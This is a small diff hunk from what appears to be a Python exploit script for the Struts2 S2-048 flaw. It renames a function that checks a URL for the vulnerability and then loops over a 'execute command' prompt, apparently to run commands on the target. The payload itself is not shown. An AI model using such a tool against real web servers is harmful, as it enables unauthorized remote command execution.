@@ -27,7 +27,7 @@ def verify(url):
     except:
         return relsult
 
-def exp(url):
+def a(url):
     if s2_048(url)['vulnerable']:
         while True:
             cmd_shell = input('[+] 执行命令:')
